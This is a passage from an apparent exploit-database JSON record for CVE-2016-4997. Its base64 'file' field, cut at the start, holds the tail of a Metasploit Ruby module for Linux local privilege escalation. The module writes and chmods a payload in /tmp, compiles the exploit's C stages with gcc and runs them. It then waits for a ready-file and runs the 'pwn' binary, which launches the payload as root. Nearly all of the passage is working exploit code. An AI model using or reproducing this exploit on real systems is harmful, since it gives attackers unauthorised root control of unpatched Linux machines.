gICAjIHNvIGluc3RlYWQgd2UgY2FuIHdyaXRlIGEgZmlsZSBpbiAvdG1wIHRvIGNhdGNoLg0KICAgIGRlY3IuZ3N1YiEoL3ByaW50ZlwoIlxbXCtcXSBEb25lXCEgTm93IHJ1biBcLlwvcHduXFxuIlwpOy8sDQogICAgICAgICAgICAgICAiaW50IGZkMiA9IG9wZW4oXCIje2Vudl9yZWFkeV9maWxlfVwiLCBPX1JEV1J8T19DUkVBVCwgMDc3Nyk7Y2xvc2UoZmQyKTsiICkNCg0KICAgICMgcGF0Y2ggaW4gdG8gcnVuIG91ciBwYXlsb2FkDQogICAgcHduLmdzdWIhKC9leGVjbFwoIlwvYmluXC9iYXNoIiwgIi1zaCIsIE5VTExcKTsvLA0KICAgICAgICAgICAgICAgImV4ZWNsKFwiI3twYXlsb2FkX3BhdGh9XCIsIE5VTEwpOyIpDQoNCiAgICBkZWYgcHduKHBheWxvYWRfcGF0aCwgcHduX2ZpbGUsIHB3biwgY29tcGlsZSkNCiAgICAgICMgbGV0cyB3cml0ZSBvdXIgcGF5bG9hZCBzaW5jZSBldmVyeXRoaW5ncyBzZXQgZm9yIHByaXYgZXNjDQogICAgICB2cHJpbnRfc3RhdHVzKCJXcml0aW5nIHBheWxvYWQgdG8gI3twYXlsb2FkX3BhdGh9IikNCiAgICAgIHdyaXRlX2ZpbGUocGF5bG9hZF9wYXRoLCBnZW5lcmF0ZV9wYXlsb2FkX2V4ZSkNCiAgICAgIGNtZF9leGVjKCJjaG1vZCA1NTUgI3twYXlsb2FkX3BhdGh9IikNCiAgICAgIHJlZ2lzdGVyX2ZpbGVfZm9yX2NsZWFudXAocGF5bG9hZF9wYXRoKQ0KDQogICAgICAjIG5vdyBsZXRzIGRyb3AgcGFydCAyLCBhbmQgZmluaXNoIHVwLg0KICAgICAgcm1fZiBwd25fZmlsZQ0KICAgICAgaWYgY29tcGlsZQ0KICAgICAgICBwcmludF9zdGF0dXMgIldyaXRpbmcgcHduIGV4ZWN1dGFibGUgdG8gI3twd25fZmlsZX0uYyINCiAgICAgICAgcm1fZiAiI3twd25fZmlsZX0uYyINCiAgICAgICAgd3JpdGVfZmlsZSgiI3twd25fZmlsZX0uYyIsIHB3bikNCiAgICAgICAgY21kX2V4ZWMoImdjYyAje3B3bl9maWxlfS5jIC1PMiAtbyAje3B3bl9maWxlfSIpDQogICAgICAgIHJlZ2lzdGVyX2ZpbGVfZm9yX2NsZWFudXAoIiN7cHduX2ZpbGV9LmMiKQ0KICAgICAgZWxzZQ0KICAgICAgICBwcmludF9zdGF0dXMgIldyaXRpbmcgcHduIGV4ZWN1dGFibGUgdG8gI3twd25fZmlsZX0iDQogICAgICAgIHdyaXRlX2ZpbGUocHduX2ZpbGUsIHB3bikNCiAgICAgIGVuZA0KICAgICAgcmVnaXN0ZXJfZmlsZV9mb3JfY2xlYW51cChwd25fZmlsZSkNCiAgICAgIGNtZF9leGVjKCJjaG1vZCAreCAje3B3bl9maWxlfTsgI3twd25fZmlsZX0iKQ0KICAgIGVuZA0KDQogICAgaWYgbm90IGNvbXBpbGUgIyB3ZSBuZWVkIHRvIG92ZXJyaWRlIHdpdGggb3VyIHByZS1jcmVhdGVkIGJpbmFyeQ0KICAgICAgIyBwd24gZmlsZQ0KICAgICAgcGF0aCA9IDo6RmlsZS5qb2luKCBNc2Y6OkNvbmZpZy5kYXRhX2RpcmVjdG9yeSwgJ2V4cGxvaXRzJywgJ0NWRS0yMDE2LTQ5OTcnLCAnMjAxNi00OTk3LXB3bi5vdXQnKQ0KICAgICAgZmQgPSA6OkZpbGUub3BlbiggcGF0aCwgInJiIikNCiAgICAgIHB3biA9IGZkLnJlYWQoZmQuc3RhdC5zaXplKQ0KICAgICAgZmQuY2xvc2UNCiAgICAgICMgZGVzYyBmaWxlDQogICAgICBwYXRoID0gOjpGaWxlLmpvaW4oIE1zZjo6Q29uZmlnLmRhdGFfZGlyZWN0b3J5LCAnZXhwbG9pdHMnLCAnQ1ZFLTIwMTYtNDk5NycsICcyMDE2LTQ5OTctZGVjci5vdXQnKQ0KICAgICAgZmQgPSA6OkZpbGUub3BlbiggcGF0aCwgInJiIikNCiAgICAgIGRlY3IgPSBmZC5yZWFkKGZkLnN0YXQuc2l6ZSkNCiAgICAgIGZkLmNsb3NlDQoNCiAgICAgICMgb3ZlcndyaXRlIHRoZSBoYXJkY29kZWQgdmFyaWFibGUgbmFtZXMgaW4gdGhlIGNvbXBpbGVkIHZlcnNpb25zDQogICAgICBlbnZfcmVhZHlfZmlsZSA9ICcvdG1wL29rRGpURlNTJw0KICAgICAgcGF5bG9hZF9wYXRoID0gJy90bXAvMjAxNl80OTk3X3BheWxvYWQnDQogICAgZW5kDQoNCiAgICAjIGNoZWNrIGZvciBzaG9ydGN1dA0KICAgIGlmIGRhdGFzdG9yZVsnUkVFWFBMT0lUJ10NCiAgICAgIHB3bihwYXlsb2FkX3BhdGgsIHB3bl9maWxlLCBwd24sIGNvbXBpbGUpDQogICAgZWxzZQ0KICAgICAgcm1fZiBkZXNjX2ZpbGUNCiAgICAgIGlmIGNvbXBpbGUNCiAgICAgICAgcHJpbnRfc3RhdHVzICJXcml0aW5nIGRlc2MgZXhlY3V0YWJsZSB0byAje2Rlc2NfZmlsZX0uYyINCiAgICAgICAgcm1fZiAiI3tkZXNjX2ZpbGV9LmMiDQogICAgICAgIHdyaXRlX2ZpbGUoIiN7ZGVzY19maWxlfS5jIiwgZGVjcikNCiAgICAgICAgcmVnaXN0ZXJfZmlsZV9mb3JfY2xlYW51cCgiI3tkZXNjX2ZpbGV9LmMiKQ0KICAgICAgICBvdXRwdXQgPSBjbWRfZXhlYygiZ2NjICN7ZGVzY19maWxlfS5jIC1tMzIgLU8yIC1vICN7ZGVzY19maWxlfSIpDQogICAgICBlbHNlDQogICAgICAgIHdyaXRlX2ZpbGUoZGVzY19maWxlLCBkZWNyKQ0KICAgICAgZW5kDQogICAgICBybV9mIGVudl9yZWFkeV9maWxlDQogICAgICByZWdpc3Rlcl9maWxlX2Zvcl9jbGVhbnVwKGVudl9yZWFkeV9maWxlKQ0KICAgICAgI3JlZ2lzdGVyX2ZpbGVfZm9yX2NsZWFudXAoZGVzY19maWxlKQ0KICAgICAgaWYgbm90IGZpbGVfZXhpc3Q/KGRlc2NfZmlsZSkNCiAgICAgICAgdnByaW50X2Vycm9yKCJnY2MgZmFpbHVyZSBvdXRwdXQ6ICN7b3V0cHV0fSIpDQogICAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpVbmtub3duLCAiI3tkZXNjX2ZpbGV9LmMgZmFpbGVkIHRvIGNvbXBpbGUiKQ0KICAgICAgZW5kDQogICAgICBpZiB0YXJnZXQubmFtZSA9PSAiVWJ1bnR1Ig0KICAgICAgICB2cHJpbnRfc3RhdHVzICJFeGVjdXRpbmcgI3tkZXNjX2ZpbGV9LCBtYXkgdGFrZSBhcm91bmQgMzVzIHRvIGZpbmlzaC4gIFdhdGNoaW5nIGZvciAje2Vudl9yZWFkeV9maWxlfSB0byBiZSBjcmVhdGVkLiINCiAgICAgIGVsc2lmIHRhcmdldC5uYW1lID09ICJGZWRvcmEiDQogICAgICAgIHZwcmludF9zdGF0dXMgIkV4ZWN1dGluZyAje2Rlc2NfZmlsZX0sIG1heSB0YWtlIGFyb3VuZCA4MHMgdG8gZmluaXNoLiAgV2F0Y2hpbmcgZm9yICN7ZW52X3JlYWR5X2ZpbGV9IHRvIGJlIGNyZWF0ZWQuIg0KICAgICAgZW5kDQogICAgICBjbWRfZXhlYygiY2htb2QgK3ggI3tkZXNjX2ZpbGV9OyAje2Rlc2NfZmlsZX0iKQ0KICAgICAgc2VjX3dhaXRlZCA9IDANCg0KICAgICAgdW50aWwgc2VjX3dhaXRlZCA+IGRhdGFzdG9yZVsnTUFYV0FJVCddIGRvDQogICAgICAgIFJleC5zbGVlcCgxKQ0KICAgICAgICBpZiBzZWNfd2FpdGVkICUgMTAgPT0gMA0KICAgICAgICAgIHZwcmludF9zdGF0dXMoIldhaXRlZCAje3NlY193YWl0ZWR9cyBzbyBmYXIiKQ0KICAgICAgICBlbmQNCg0KICAgICAgICBpZiBmaWxlX2V4aXN0PyhlbnZfcmVhZHlfZmlsZSkNCiAgICAgICAgICBwcmludF9nb29kKCJkZXNjIGZpbmlzaGVkLCBlbnYgcmVhZHkuIikNCiAgICAgICAgICBwd24ocGF5bG9hZF9wYXRoLCBwd25fZmlsZSwgcHduLCBjb21waWxlKQ0KICAgICAgICAgIHJldHVybg0KICAgICAgICBlbmQNCiAgICAgICAgc2VjX3dhaXRlZCArPTENCiAgICAgIGVuZA0KICAgIGVuZA0KICBlbmQNCmVuZA==", 
    "filename": "platforms/lin_x86/local/40435.rb", 
    "id": "40435", 
    "cves": [
        "CVE-2016-4997"
    ]
}